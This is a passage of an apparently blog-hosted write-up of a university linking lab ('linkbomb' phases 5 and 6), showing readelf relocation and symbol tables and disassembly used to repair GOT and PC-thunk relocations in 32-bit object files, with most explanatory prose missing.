class="number">00</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main)&gt; gcc -m32 -no-pie -o linkbomb main.o phase5.</span><br><span class="line">grxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main)&gt; ./linkbomb</span><br><span class="line">%?%<span class="number">00</span>##Y?</span><br></pre></td></tr></table></figure><p>pdf7</p><p></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main)&gt; readelf -r phase5.o</span><br><span class="line"></span><br><span class="line">Relocation section <span class="string">&#x27;.rel.text&#x27;</span> at offset <span class="number">0x7f8</span> contains <span class="number">23</span> entries:</span><br><span class="line"> Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line"><span class="number">00000066</span>  <span class="number">00000</span>d01 R_386_32          <span class="number">00000020</span>   yAnKQn</span><br><span class="line"><span class="number">00000075</span>  <span class="number">00000501</span> R_386_32          <span class="number">00000000</span>   .rodata</span><br><span class="line"><span class="number">00000086</span>  <span class="number">00000</span>d01 R_386_32          <span class="number">00000020</span>   yAnKQn</span><br><span class="line"><span class="number">00000110</span>  <span class="number">00000f</span>02 R_386_PC32        <span class="number">0000005</span>d   transform_code</span><br><span class="line"><span class="number">0000009</span>a  <span class="number">00000</span>d01 R_386_32          <span class="number">00000020</span>   yAnKQn</span><br><span class="line"><span class="number">000000b</span>d  <span class="number">00000</span>d01 R_386_32          <span class="number">00000020</span>   yAnKQn</span><br><span class="line"><span class="number">000000</span>cc  <span class="number">00000</span>d01 R_386_32          <span class="number">00000020</span>   yAnKQn</span><br><span class="line"><span class="number">000000</span>ab  <span class="number">00000</span>d01 R_386_32          <span class="number">00000020</span>   yAnKQn</span><br><span class="line"><span class="number">000000f</span>9  <span class="number">00000e01</span> R_386_32          <span class="number">0000010</span>c   aQSEth</span><br><span class="line"><span class="number">00000107</span>  <span class="number">00000e01</span> R_386_32          <span class="number">0000010</span>c   aQSEth</span><br><span class="line"><span class="number">000000</span>dd  <span class="number">00000</span>d01 R_386_32          <span class="number">00000020</span>   yAnKQn</span><br><span class="line"><span class="number">00000118</span>  <span class="number">00000e01</span> R_386_32          <span class="number">0000010</span>c   aQSEth</span><br><span class="line"><span class="number">00000138</span>  <span class="number">00001302</span> R_386_PC32        <span class="number">00000000</span>   <span class="built_in">strlen</span></span><br><span class="line"><span class="number">0000024</span>e  <span class="number">00001501</span> R_386_32          <span class="number">00000110</span>   encoder</span><br><span class="line"><span class="number">00000162</span>  <span class="number">00000e01</span> R_386_32          <span class="number">0000010</span>c   aQSEth</span><br><span class="line"><span class="number">000001</span>c0  <span class="number">00001302</span> R_386_PC32        <span class="number">00000000</span>   <span class="built_in">strlen</span></span><br><span class="line"><span class="number">000001e4</span>  <span class="number">00001101</span> R_386_32          <span class="number">00000080</span>   AycPNh</span><br><span class="line"><span class="number">000001</span>ea  <span class="number">00000e01</span> R_386_32          <span class="number">0000010</span>c   aQSEth</span><br><span class="line"><span class="number">00000246</span>  <span class="number">00001002</span> R_386_PC32        <span class="number">000000</span>ef   generate_code</span><br><span class="line"><span class="number">00000263</span>  <span class="number">00000</span>c01 R_386_32          <span class="number">00000100</span>   tqdzfNje</span><br><span class="line"><span class="number">00000256</span>  <span class="number">00000</span>c01 R_386_32          <span class="number">00000100</span>   tqdzfNje</span><br><span class="line"><span class="number">0000015</span>c  <span class="number">00001101</span> R_386_32          <span class="number">00000080</span>   AycPNh</span><br><span class="line"><span class="number">00000268</span>  <span class="number">00001702</span> R_386_PC32        <span class="number">00000000</span>   <span class="built_in">puts</span></span><br></pre></td></tr></table></figure><h2 id="phase6"><a href="#phase6" class="headerlink" title="phase6"></a>phase6</h2><p> <a href="https://grxer.github.io/2023/05/04/ELF%20Dynamical-link/">https://grxer.github.io/2023/05/04/ELF%20Dynamical-link/</a></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main)&gt; gcc -m32 -no-pie -o linkbomb main.o phase6.o</span><br><span class="line">grxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main)&gt; ./linkbomb</span><br><span class="line">fish: Job <span class="number">1</span>, <span class="string">&#x27;./linkbomb&#x27;</span> terminated by signal <span class="title function_">SIGSEGV</span> <span class="params">(Address boundary error)</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main) [SIGSEGV]&gt; readelf -r phase6.o</span><br><span class="line"></span><br><span class="line">Relocation section <span class="string">&#x27;.rel.text&#x27;</span> at offset <span class="number">0x9e0</span> contains <span class="number">35</span> entries:</span><br><span class="line"> Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line"><span class="number">00000007</span>  <span class="number">00001902</span> R_386_PC32        <span class="number">00000000</span>   __x86.get_pc_thunk.ax</span><br><span class="line"><span class="number">00000000</span>  <span class="number">00000000</span> R_386_NONE</span><br><span class="line"><span class="number">0000005</span>c  <span class="number">00001902</span> R_386_PC32        <span class="number">00000000</span>   __x86.get_pc_thunk.ax</span><br><span class="line"><span class="number">00000000</span>  <span class="number">00000000</span> R_386_NONE</span><br><span class="line"><span class="number">00000067</span>  <span class="number">00001</span>d2b R_386_GOT32X      <span class="number">00000020</span>   yAnKQn</span><br><span class="line"><span class="number">00000083</span>  <span class="number">00000509</span> R_386_GOTOFF      <span class="number">00000000</span>   .rodata</span><br><span class="line"><span class="number">00000000</span>  <span class="number">00000000</span> R_386_NONE</span><br><span class="line"><span class="number">00000000</span>  <span class="number">00000000</span> R_386_NONE</span><br><span class="line"><span class="number">000000b</span>b  <span class="number">00001</span>d2b R_386_GOT32X      <span class="number">00000020</span>   yAnKQn</span><br><span class="line"><span class="number">00000000</span>  <span class="number">00000000</span> R_386_NONE</span><br><span class="line"><span class="number">000000e0</span>  <span class="number">00001</span>d2b R_386_GOT32X      <span class="number">00000020</span>   yAnKQn</span><br><span class="line"><span class="number">000000f</span>3  <span class="number">00001</span>d2b R_386_GOT32X      <span class="number">00000020</span>   yAnKQn</span><br><span class="line"><span class="number">00000113</span>  <span class="number">00002102</span> R_386_PC32        <span class="number">00000000</span>   __x86.get_pc_thunk.bx</span><br><span class="line"><span class="number">00000000</span>  <span class="number">00000000</span> R_386_NONE</span><br><span class="line"><span class="number">00000000</span>  <span class="number">00000000</span> R_386_NONE</span><br><span class="line"><span class="number">00000000</span>  <span class="number">00000000</span> R_386_NONE</span><br><span class="line"><span class="number">00000141</span>  <span class="number">00001f</span>04 R_386_PLT32       <span class="number">00000058</span>   transform_code</span><br><span class="line"><span class="number">0000014</span>c  <span class="number">00001e2</span>b R_386_GOT32X      <span class="number">000000</span>ac   aQSEth</span><br><span class="line"><span class="number">0000016</span>c  <span class="number">00002102</span> R_386_PC32        <span class="number">00000000</span>   __x86.get_pc_thunk.bx</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main)&gt; readelf -s phase6.o</span><br><span class="line"></span><br><span class="line">Symbol table <span class="string">&#x27;.symtab&#x27;</span> contains <span class="number">42</span> entries:</span><br><span class="line">   Num:    Value  Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     <span class="number">0</span>: <span class="number">00000000</span>     <span class="number">0</span> NOTYPE  LOCAL  DEFAULT  UND</span><br><span class="line">     <span class="number">1</span>: <span class="number">00000000</span>     <span class="number">0</span> FILE    LOCAL  DEFAULT  ABS phase6.c</span><br><span class="line">     <span class="number">2</span>: <span class="number">00000000</span>     <span class="number">0</span> SECTION LOCAL  DEFAULT    <span class="number">3</span> .text</span><br><span class="line">     <span class="number">3</span>: <span class="number">00000000</span>     <span class="number">0</span> SECTION LOCAL  DEFAULT    <span class="number">5</span> .data</span><br><span class="line">     <span class="number">4</span>: <span class="number">00000000</span>     <span class="number">0</span> SECTION LOCAL  DEFAULT    <span class="number">6</span> .bss</span><br><span class="line">     <span class="number">5</span>: <span class="number">00000000</span>     <span class="number">0</span> SECTION LOCAL  DEFAULT    <span class="number">7</span> .rodata</span><br><span class="line">     <span class="number">6</span>: <span class="number">00000000</span>     <span class="number">0</span> SECTION LOCAL  DEFAULT    <span class="number">9</span> .data.rel.local</span><br><span class="line">     <span class="number">7</span>: <span class="number">00000000</span>     <span class="number">0</span> SECTION LOCAL  DEFAULT   <span class="number">11</span> .data.rel</span><br><span class="line">     <span class="number">8</span>: <span class="number">00000000</span>     <span class="number">0</span> SECTION LOCAL  DEFAULT   <span class="number">13</span> .text.__x86.get_[...]</span><br><span class="line">     <span class="number">9</span>: <span class="number">00000000</span>     <span class="number">0</span> SECTION LOCAL  DEFAULT   <span class="number">14</span> .text.__x86.get_[...]</span><br><span class="line">    <span class="number">10</span>: <span class="number">00000000</span>     <span class="number">0</span> SECTION LOCAL  DEFAULT   <span class="number">16</span> .note.GNU-<span class="built_in">stack</span></span><br><span class="line">    <span class="number">11</span>: <span class="number">00000102</span>     <span class="number">0</span> NOTYPE  LOCAL  DEFAULT    <span class="number">3</span> .L6</span><br><span class="line">    <span class="number">12</span>: <span class="number">00000000</span>     <span class="number">0</span> SECTION LOCAL  DEFAULT   <span class="number">17</span> .eh_frame</span><br><span class="line">    <span class="number">13</span>: <span class="number">0000008b</span>     <span class="number">0</span> NOTYPE  LOCAL  DEFAULT    <span class="number">3</span> .L14</span><br><span class="line">    <span class="number">14</span>: <span class="number">00000090</span>     <span class="number">0</span> NOTYPE  LOCAL  DEFAULT    <span class="number">3</span> .L13</span><br><span class="line">    <span class="number">15</span>: <span class="number">000000</span>a6     <span class="number">0</span> NOTYPE  LOCAL  DEFAULT    <span class="number">3</span> .L12</span><br><span class="line">    <span class="number">16</span>: <span class="number">000000b</span>9     <span class="number">0</span> NOTYPE  LOCAL  DEFAULT    <span class="number">3</span> .L11</span><br><span class="line">    <span class="number">17</span>: <span class="number">000000</span>cd     <span class="number">0</span> NOTYPE  LOCAL  DEFAULT    <span class="number">3</span> .L10</span><br><span class="line">    <span class="number">18</span>: <span class="number">000000</span>de     <span class="number">0</span> NOTYPE  LOCAL  DEFAULT    <span class="number">3</span> .L9</span><br><span class="line">    <span class="number">19</span>: <span class="number">000000f</span>1     <span class="number">0</span> NOTYPE  LOCAL  DEFAULT    <span class="number">3</span> .L7</span><br><span class="line">    <span class="number">20</span>: <span class="number">00000000</span>     <span class="number">0</span> SECTION LOCAL  DEFAULT   <span class="number">15</span> .comment</span><br><span class="line">    <span class="number">21</span>: <span class="number">00000000</span>     <span class="number">0</span> SECTION LOCAL  DEFAULT    <span class="number">1</span> .group</span><br><span class="line">    <span class="number">22</span>: <span class="number">00000000</span>     <span class="number">0</span> SECTION LOCAL  DEFAULT    <span class="number">2</span> .group</span><br><span class="line">    <span class="number">23</span>: <span class="number">00000000</span>   <span class="number">158</span> OBJECT  GLOBAL DEFAULT    <span class="number">5</span> cjHQHR</span><br><span class="line">    <span class="number">24</span>: <span class="number">00000000</span>    <span class="number">88</span> FUNC    GLOBAL DEFAULT    <span class="number">3</span> OOtZxJJdNH</span><br><span class="line">    <span class="number">25</span>: <span class="number">00000000</span>     <span class="number">0</span> FUNC    GLOBAL HIDDEN    <span class="number">13</span> __x86.get_pc_thunk.ax</span><br><span class="line">    <span class="number">26</span>: <span class="number">00000000</span>     <span class="number">0</span> NOTYPE  GLOBAL DEFAULT  UND _GLOBAL_OFFSET_TABLE_</span><br><span class="line">    <span class="number">27</span>: <span class="number">00000000</span>     <span class="number">4</span> OBJECT  GLOBAL DEFAULT    <span class="number">9</span> phase_id</span><br><span class="line">    <span class="number">28</span>: <span class="number">000000</span>a0    <span class="number">10</span> OBJECT  GLOBAL DEFAULT    <span class="number">5</span> tqdzfNje</span><br><span class="line">    <span class="number">29</span>: <span class="number">00000020</span>    <span class="number">52</span> OBJECT  GLOBAL DEFAULT    <span class="number">7</span> yAnKQn</span><br><span class="line">    <span class="number">30</span>: <span class="number">000000</span>ac     <span class="number">4</span> OBJECT  GLOBAL DEFAULT    <span class="number">5</span> aQSEth</span><br><span class="line">    <span class="number">31</span>: <span class="number">00000058</span>   <span class="number">179</span> FUNC    GLOBAL DEFAULT    <span class="number">3</span> transform_code</span><br><span class="line">    <span class="number">32</span>: <span class="number">0000010b</span>    <span class="number">89</span> FUNC    GLOBAL DEFAULT    <span class="number">3</span> generate_code</span><br><span class="line">    <span class="number">33</span>: <span class="number">00000000</span>     <span class="number">0</span> FUNC    GLOBAL HIDDEN    <span class="number">14</span> __x86.get_pc_thunk.bx</span><br><span class="line">    <span class="number">34</span>: <span class="number">00000080</span>   <span class="number">128</span> OBJECT  GLOBAL DEFAULT    <span class="number">7</span> AycPNh</span><br><span class="line">    <span class="number">35</span>: <span class="number">00000164</span>   <span class="number">156</span> FUNC    GLOBAL DEFAULT    <span class="number">3</span> encode_1</span><br><span class="line">    <span class="number">36</span>: <span class="number">00000000</span>     <span class="number">0</span> NOTYPE  GLOBAL DEFAULT  UND <span class="built_in">strlen</span></span><br><span class="line">    <span class="number">37</span>: <span class="number">00000200</span>   <span class="number">155</span> FUNC    GLOBAL DEFAULT    <span class="number">3</span> encode_2</span><br><span class="line">    <span class="number">38</span>: <span class="number">00000000</span>     <span class="number">8</span> OBJECT  GLOBAL DEFAULT   <span class="number">11</span> encoder</span><br><span class="line">    <span class="number">39</span>: <span class="number">0000029b</span>    <span class="number">82</span> FUNC    GLOBAL DEFAULT    <span class="number">3</span> do_phase</span><br><span class="line">    <span class="number">40</span>: <span class="number">00000000</span>     <span class="number">0</span> NOTYPE  GLOBAL DEFAULT  UND <span class="built_in">puts</span></span><br><span class="line">    <span class="number">41</span>: <span class="number">00000008</span>     <span class="number">4</span> OBJECT  GLOBAL DEFAULT   <span class="number">11</span> phase</span><br></pre></td></tr></table></figure><p>getpcnop</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Disassembly of section .text.__x86.get_pc_thunk.ax:</span><br><span class="line"></span><br><span class="line"><span class="number">00000000</span> &lt;__x86.get_pc_thunk.ax&gt;:</span><br><span class="line">   <span class="number">0</span>:    <span class="number">90</span>                   nop</span><br><span class="line">   <span class="number">1</span>:    <span class="number">90</span>                   nop</span><br><span class="line">   <span class="number">2</span>:    <span class="number">90</span>                   nop</span><br><span class="line">   <span class="number">3</span>:    <span class="number">90</span>                   nop</span><br><span class="line"></span><br><span class="line">Disassembly of section .text.__x86.get_pc_thunk.bx:</span><br><span class="line"></span><br><span class="line"><span class="number">00000000</span> &lt;__x86.get_pc_thunk.bx&gt;:</span><br><span class="line">   <span class="number">0</span>:    <span class="number">90</span>                   nop</span><br><span class="line">   <span class="number">1</span>:    <span class="number">90</span>                   nop</span><br><span class="line">   <span class="number">2</span>:    <span class="number">90</span>                   nop</span><br><span class="line">   <span class="number">3</span>:    <span class="number">90</span>                   nop</span><br></pre></td></tr></table></figure><p></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Disassembly of section .text.__x86.get_pc_thunk.ax:</span><br><span class="line"></span><br><span class="line"><span class="number">00000000</span> &lt;__x86.get_pc_thunk.ax&gt;:</span><br><span class="line">   <span class="number">0</span>:   <span class="number">8b</span> <span class="number">04</span> <span class="number">24</span>                mov    (%esp),%eax</span><br><span class="line">   <span class="number">3</span>:   c3                      ret</span><br><span class="line"></span><br><span class="line">Disassembly of section .text.__x86.get_pc_thunk.bx:</span><br><span class="line"></span><br><span class="line"><span class="number">00000000</span> &lt;__x86.get_pc_thunk.bx&gt;:</span><br><span class="line">   <span class="number">0</span>:   <span class="number">8b</span> <span class="number">1</span>c <span class="number">24</span>                mov    (%esp),%ebx</span><br><span class="line">   <span class="number">3</span>:   c3                      ret</span><br></pre></td></tr></table></figure><h4 id="generate-code-1"><a href="#generate-code-1" class="headerlink" title="generate_code"></a>generate_code</h4><p></p><p><img src="/2023/05/08/ics4-linklab/image-20230507232413843.png" alt="image-20230507232413843"></p><p><img src="/2023/05/08/ics4-linklab/image-20230507232536405.png" alt="image-20230507232536405"></p><p><img src="/2023/05/08/ics4-linklab/image-20230507233555928.png" alt="image-20230507233555928"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0000010b</span> &lt;generate_code&gt;:</span><br><span class="line"> <span class="number">10b</span>:    <span class="number">55</span>                   push   %ebp</span><br><span class="line"> <span class="number">10</span>c:    <span class="number">89</span> e5                mov    %esp,%ebp</span><br><span class="line"> <span class="number">10</span>e:    <span class="number">53</span>                   push   %ebx</span><br><span class="line"> <span class="number">10f</span>:    <span class="number">83</span> ec <span class="number">14</span>             sub    $<span class="number">0x14</span>,%esp</span><br><span class="line"> <span class="number">112</span>:    e8 fc ff ff ff       call   <span class="number">113</span> &lt;generate_code+<span class="number">0x8</span>&gt; <span class="comment">//__x86.get_pc_thunk.bx</span></span><br><span class="line"> <span class="number">117</span>:    <span class="number">81</span> c3 <span class="number">02</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    add    $<span class="number">0x2</span>,%ebx</span><br><span class="line"> <span class="number">11</span>d:    <span class="number">8b</span> <span class="number">83</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    mov    <span class="number">0x0</span>(%ebx),%eax</span><br><span class="line"> <span class="number">123</span>:    <span class="number">8b</span> <span class="number">55</span> <span class="number">08</span>             mov    <span class="number">0x8</span>(%ebp),%edx</span><br><span class="line"> <span class="number">126</span>:    <span class="number">89</span> <span class="number">10</span>                mov    %edx,(%eax)</span><br><span class="line"> <span class="number">128</span>:    c7 <span class="number">45</span> f4 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> movl   $<span class="number">0x0</span>,<span class="number">-0xc</span>(%ebp)</span><br><span class="line"> <span class="number">12f</span>:    eb <span class="number">25</span>                jmp    <span class="number">156</span> &lt;generate_code+<span class="number">0x4b</span>&gt;</span><br><span class="line"> <span class="number">131</span>:    <span class="number">8b</span> <span class="number">83</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    mov    <span class="number">0x0</span>(%ebx),%eax</span><br><span class="line"> <span class="number">137</span>:    <span class="number">8b</span> <span class="number">00</span>                mov    (%eax),%eax</span><br><span class="line"> <span class="number">139</span>:    <span class="number">83</span> ec <span class="number">08</span>             sub    $<span class="number">0x8</span>,%esp</span><br><span class="line"> <span class="number">13</span>c:    ff <span class="number">75</span> f4             push   <span class="number">-0xc</span>(%ebp)</span><br><span class="line"> <span class="number">13f</span>:    <span class="number">50</span>                   push   %eax</span><br><span class="line"> <span class="number">140</span>:    e8 fc ff ff ff       call   <span class="number">141</span> &lt;generate_code+<span class="number">0x36</span>&gt;</span><br><span class="line"> <span class="number">145</span>:    <span class="number">83</span> c4 <span class="number">10</span>             add    $<span class="number">0x10</span>,%esp</span><br><span class="line"> <span class="number">148</span>:    <span class="number">89</span> c2                mov    %eax,%edx</span><br><span class="line"> <span class="number">14</span>a:    <span class="number">8b</span> <span class="number">83</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    mov    <span class="number">0x0</span>(%ebx),%eax</span><br><span class="line"> <span class="number">150</span>:    <span class="number">89</span> <span class="number">10</span>                mov    %edx,(%eax)</span><br><span class="line"> <span class="number">152</span>:    <span class="number">83</span> <span class="number">45</span> f4 <span class="number">01</span>          addl   $<span class="number">0x1</span>,<span class="number">-0xc</span>(%ebp)</span><br><span class="line"> <span class="number">156</span>:    <span class="number">8b</span> <span class="number">45</span> f4             mov    <span class="number">-0xc</span>(%ebp),%eax</span><br><span class="line"> <span class="number">159</span>:    <span class="number">83</span> f8 <span class="number">0</span>c             cmp    $<span class="number">0xc</span>,%eax</span><br><span class="line"> <span class="number">15</span>c:    <span class="number">76</span> d3                jbe    <span class="number">131</span> &lt;generate_code+<span class="number">0x26</span>&gt;</span><br><span class="line"> <span class="number">15</span>e:    <span class="number">90</span>                   nop</span><br><span class="line"> <span class="number">15f</span>:    <span class="number">8b</span> <span class="number">5</span>d fc             mov    <span class="number">-0x4</span>(%ebp),%ebx</span><br><span class="line"> <span class="number">162</span>:    c9                   leave  </span><br><span class="line"> <span class="number">163</span>:    c3                   ret  </span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">126</span>:    <span class="number">89</span> <span class="number">10</span>                mov    %edx,(%eax)</span><br></pre></td></tr></table></figure><p>eax0x2,</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">117</span>:    <span class="number">81</span> c3 <span class="number">02</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    add    $<span class="number">0x2</span>,%ebx</span><br><span class="line"><span class="number">11</span>d:    <span class="number">8b</span> <span class="number">83</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    mov    <span class="number">0x0</span>(%ebx),%eax</span><br></pre></td></tr></table></figure><p><code> 117:81 c3 02 00 00 00    add    $0x2,%ebx</code>got</p><p><code>11d:8b 83 00 00 00 00      mov    0x0(%ebx)</code>got</p><p></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">131</span>:    <span class="number">8b</span> <span class="number">83</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    mov    <span class="number">0x0</span>(%ebx),%eax</span><br></pre></td></tr></table></figure><p>got</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">000002</span>a9  <span class="number">00001</span>a0a R_386_GOTPC       <span class="number">00000000</span>   _GLOBAL_OFFSET_TABLE_</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">19</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">0</span>A <span class="number">1</span>A <span class="number">00</span> <span class="number">00</span></span><br></pre></td></tr></table></figure><p>got</p><p><code> 14a:8b 83 00 00 00 00    mov    0x0(%ebx),%eax</code></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0000014</span>c  <span class="number">00001e2</span>b R_386_GOT32X      <span class="number">000000</span>ac   aQSEth</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">1F</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">2B</span> <span class="number">1</span>E <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">33</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">2B</span> <span class="number">1</span>E <span class="number">00</span> <span class="number">00</span></span><br></pre></td></tr></table></figure><h4 id="transform-code-1"><a href="#transform-code-1" class="headerlink" title="transform_code"></a>transform_code</h4><p><img src="/2023/05/08/ics4-linklab/image-20230508011418971.png" alt="image-20230508011418971"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">00000058</span> &lt;transform_code&gt;:</span><br><span class="line">  <span class="number">58</span>:    <span class="number">55</span>                   push   %ebp</span><br><span class="line">  <span class="number">59</span>:    <span class="number">89</span> e5                mov    %esp,%ebp</span><br><span class="line">  <span class="number">5b</span>:    e8 fc ff ff ff       call   <span class="number">5</span>c &lt;transform_code+<span class="number">0x4</span>&gt;<span class="comment">//__x86.get_pc_thunk.ax</span></span><br><span class="line">  <span class="number">60</span>:    <span class="number">05</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       add    $<span class="number">0x1</span>,%eax</span><br><span class="line">  <span class="number">65</span>:    <span class="number">8b</span> <span class="number">90</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    mov    <span class="number">0x0</span>(%eax),%edx</span><br><span class="line">  <span class="number">6b</span>:    <span class="number">8b</span> <span class="number">4</span>d <span class="number">0</span>c             mov    <span class="number">0xc</span>(%ebp),%ecx</span><br><span class="line">  <span class="number">6</span>e:    <span class="number">8b</span> <span class="number">14</span> <span class="number">8</span>a             <span class="title function_">mov</span>    <span class="params">(%edx,%ecx,<span class="number">4</span>)</span>,%edx</span><br><span class="line">  71:    83 e2 07             and    $0x7,%edx</span><br><span class="line">  74:    83 fa 07             cmp    $0x7,%edx</span><br><span class="line">  77:    0f 87 85 00 00 00    ja     102 &lt;.L6&gt;</span><br><span class="line">  7d:    c1 e2 02             shl    $0x2,%edx</span><br><span class="line">  80:    8b 94 02 54 00 00 00 mov    0<span class="title function_">x54</span><span class="params">(%edx,%eax,<span class="number">1</span>)</span>,%edx</span><br><span class="line">  87:    01 c2                add    %eax,%edx</span><br><span class="line">  89:    ff e2                jmp    *%edx</span><br><span class="line"></span><br><span class="line">0000008b &lt;.L14&gt;:</span><br><span class="line">  8b:    f7 55 08             notl   0<span class="title function_">x8</span><span class="params">(%ebp)</span></span><br><span class="line">  8e:    eb 76                jmp    106 &lt;.L6+0x4&gt;</span><br><span class="line"></span><br><span class="line">00000090 &lt;.L13&gt;:</span><br><span class="line">  90:    8b 80 00 00 00 00    mov    0<span class="title function_">x0</span><span class="params">(%eax)</span>,%eax</span><br><span class="line">  96:    8b 55 0c             mov    0<span class="title function_">xc</span><span class="params">(%ebp)</span>,%edx</span><br><span class="line">  99:    8b 04 90             <span class="title function_">mov</span>    <span class="params">(%eax,%edx,<span class="number">4</span>)</span>,%eax</span><br><span class="line">  9c:    83 e0 03             and    $0x3,%eax</span><br><span class="line">  9f:    89 c1                mov    %eax,%ecx</span><br><span class="line">  a1:    d3 7d 08             sarl   %cl,0<span class="title function_">x8</span><span class="params">(%ebp)</span></span><br><span class="line">  a4:    eb 60                jmp    106 &lt;.L6+0x4&gt;</span><br><span class="line"></span><br><span class="line">000000a6 &lt;.L12&gt;:</span><br><span class="line">  a6:    8b 80 00 00 00 00    mov    0<span class="title function_">x0</span><span class="params">(%eax)</span>,%eax</span><br><span class="line">  ac:    8b 55 0c             mov    0<span class="title function_">xc</span><span class="params">(%ebp)</span>,%edx</span><br><span class="line">  af:    8b 04 90             <span class="title function_">mov</span>    <span class="params">(%eax,%edx,<span class="number">4</span>)</span>,%eax</span><br><span class="line">  b2:    f7 d0                not    %eax</span><br><span class="line">  b4:    21 45 08             and    %eax,0<span class="title function_">x8</span><span class="params">(%ebp)</span></span><br><span class="line">  b7:    eb 4d                jmp    106 &lt;.L6+0x4&gt;</span><br><span class="line"></span><br><span class="line">000000b9 &lt;.L11&gt;:</span><br><span class="line">  b9:    8b 80 00 00 00 00    mov    0<span class="title function_">x0</span><span class="params">(%eax)</span>,%eax</span><br><span class="line">  bf:    8b 55 0c             mov    0<span class="title function_">xc</span><span class="params">(%ebp)</span>,%edx</span><br><span class="line">  c2:    8b 04 90             <span class="title function_">mov</span>    <span class="params">(%eax,%edx,<span class="number">4</span>)</span>,%eax</span><br><span class="line">  c5:    c1 e0 08             shl    $0x8,%eax</span><br><span class="line">  c8:    09 45 08             or     %eax,0<span class="title function_">x8</span><span class="params">(%ebp)</span></span><br><span class="line">  cb:    eb 39                jmp    106 &lt;.L6+0x4&gt;</span><br><span class="line"></span><br><span class="line">000000cd &lt;.L10&gt;:</span><br><span class="line">  cd:    8b 80 00 00 00 00    mov    0<span class="title function_">x0</span><span class="params">(%eax)</span>,%eax</span><br><span class="line">  d3:    8b 55 0c             mov    0<span class="title function_">xc</span><span class="params">(%ebp)</span>,%edx</span><br><span class="line">  d6:    8b 04 90             <span class="title function_">mov</span>    <span class="params">(%eax,%edx,<span class="number">4</span>)</span>,%eax</span><br><span class="line">  d9:    31 45 08             xor    %eax,0<span class="title function_">x8</span><span class="params">(%ebp)</span></span><br><span class="line">  dc:    eb 28                jmp    106 &lt;.L6+0x4&gt;</span><br><span class="line"></span><br><span class="line">000000de &lt;.L9&gt;:</span><br><span class="line">  de:    8b 80 00 00 00 00    mov    0<span class="title function_">x0</span><span class="params">(%eax)</span>,%eax</span><br><span class="line">  e4:    8b 55 0c             mov    0<span class="title function_">xc</span><span class="params">(%ebp)</span>,%edx</span><br><span class="line">  e7:    8b 04 90             <span class="title function_">mov</span>    <span class="params">(%eax,%edx,<span class="number">4</span>)</span>,%eax</span><br><span class="line">  ea:    f7 d0                not    %eax</span><br><span class="line">  ec:    09 45 08             or     %eax,0<span class="title function_">x8</span><span class="params">(%ebp)</span></span><br><span class="line">  ef:    eb 15                jmp    106 &lt;.L6+0x4&gt;</span><br><span class="line"></span><br><span class="line">000000f1 &lt;.L7&gt;:</span><br><span class="line">  f1:    8b 80 00 00 00 00    mov    0<span class="title function_">x0</span><span class="params">(%eax)</span>,%eax</span><br><span class="line">  f7:    8b 55 0c             mov    0<span class="title function_">xc</span><span class="params">(%ebp)</span>,%edx</span><br><span class="line">  fa:    8b 04 90             <span class="title function_">mov</span>    <span class="params">(%eax,%edx,<span class="number">4</span>)</span>,%eax</span><br><span class="line">  fd:    01 45 08             add    %eax,0<span class="title function_">x8</span><span class="params">(%ebp)</span></span><br><span class="line"> 100:    eb 04                jmp    106 &lt;.L6+0x4&gt;</span><br><span class="line"></span><br><span class="line">00000102 &lt;.L6&gt;:</span><br><span class="line"> 102:    f7 5d 08             negl   0<span class="title function_">x8</span><span class="params">(%ebp)</span></span><br><span class="line"> 105:    90                   nop</span><br><span class="line"> 106:    8b 45 08             mov    0<span class="title function_">x8</span><span class="params">(%ebp)</span>,%eax</span><br><span class="line"> 109:    5d                   pop    %ebp</span><br><span class="line"> 10a:    c3                   ret    </span><br></pre></td></tr></table></figure><p>getpc</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">5b</span>:    e8 fc ff ff ff       call   <span 